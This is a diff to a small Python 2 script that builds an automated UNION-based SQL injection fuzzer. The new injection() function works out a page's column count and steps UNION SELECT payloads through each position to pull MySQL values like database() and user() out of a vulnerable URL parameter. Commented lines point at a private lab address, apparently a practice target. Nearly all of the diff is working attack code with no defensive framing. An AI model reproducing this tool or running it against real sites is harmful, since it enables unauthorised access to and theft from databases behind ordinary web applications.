@@ -34,15 +34,24 @@ def get_table_size(page):
 
     return count
 
+
+# Takes page to fuzz for injections and params to check for.
+def injection(page, params):
+    columns = get_table_size(page)
+    page1 = getPage(page)
+
+    union_urls = ['%20' + str(i) for i in xrange(1, columns) ]
+    for param in params:
+        for i in xrange(0, len(union_urls) + 1):
+            new_url = page + '%20UNION%20SELECT' + ",".join(union_urls[:i] + ['%20' + param] + union_urls[i:])
+            #print new_url
+            print html_diff(page1, getPage(new_url))
+
+
 if __name__ == '__main__':
 
     page = sys.argv[1]
 
-    #if '-f' in sys.argv:
-    #    print sys.argv.index('-f') 
-    columns = get_table_size(page)
-
-    page1 = getPage(page)
     #page2 = getPage(page + '%20UNION%20SELECT%201,%20database(),%202,%203')
 
     #page2 = getPage('192.168.83.130/cat.php?id=1%20UNION%20SELECT%201,%20database(),%202')
@@ -53,14 +62,12 @@ if __name__ == '__main__':
 
     #print html_diff(page1, page2)
 
-    union_urls = ['%20' + str(i) for i in xrange(1, columns) ]
-    #union_urls.append('%20database()') 
-    for i in xrange(0, len(union_urls) + 1):
-        #print union_urls[:i] + ['%20database()'] + union_urls[i:]
-        new_url = page + '%20UNION%20SELECT' + ",".join(union_urls[:i] + ['%20database()'] + union_urls[i:])
-        print new_url
-        #print html_diff(page1, getPage(new_url))
+    columns = get_table_size(page)
 
+    page1 = getPage(page)
+
+    mysql_params = ['database()', 'user()']
+    print injection(page, mysql_params)
 
 
 
